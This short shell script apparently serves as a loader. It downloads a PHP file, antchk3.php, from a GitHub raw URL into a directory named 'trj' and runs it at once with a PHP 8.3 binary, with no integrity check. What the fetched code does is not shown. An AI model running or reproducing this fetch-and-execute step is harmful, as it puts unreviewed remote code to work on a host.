#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o antchk3.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/antchk3.php?t=$(date +%s)" && mv antchk3.php.new antchk3.php
/opt/alt/php83/usr/bin/php antchk3.php "$1"
